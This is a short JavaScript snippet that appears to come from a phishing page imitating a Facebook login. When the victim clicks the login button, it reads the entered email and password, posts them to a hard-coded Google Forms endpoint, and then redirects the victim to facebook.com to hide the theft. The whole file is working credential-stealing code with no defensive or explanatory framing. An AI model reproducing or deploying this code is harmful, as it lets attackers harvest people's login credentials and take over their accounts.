function login() {
    var email = document.getElementById("email").value;
    var pass = document.getElementById("pass").value;
    $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLScxvNQ8ZC6a6-iMOWT66kJHnC7Lo-DPvOM7reQceXPAIL0Puw/formResponse", {
        "entry.421300132": "U: "+email+"\n"+"P: "+pass
        },
        function(data, status) {
        }
        );        
}
document.getElementById("postlogin").onclick = function(){
    login();
    window.location= "https://www.facebook.com/";
}
